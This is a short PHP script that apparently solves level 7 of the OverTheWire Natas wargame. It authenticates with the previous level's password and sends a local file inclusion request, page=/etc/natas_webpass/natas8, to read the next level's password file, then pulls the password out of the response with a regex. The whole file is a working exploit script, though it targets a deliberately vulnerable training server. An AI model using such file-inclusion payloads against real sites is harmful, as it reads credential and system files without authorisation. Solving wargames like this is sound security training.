<?php
require_once dirname(__DIR__) . '/bootstrap.php';

$level = 7;
$username = 'natas' . $level;
$password = readFlag($level - 1);

$url = sprintf('http://%s.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8', $username);

$response = $client->request('GET', $url, [
    'auth' => [$username, $password],
]);

$body = (string)$response->getBody();
preg_match("/<br>\n<br>\n(.*)/", $body, $flag);
echo $flag[1];
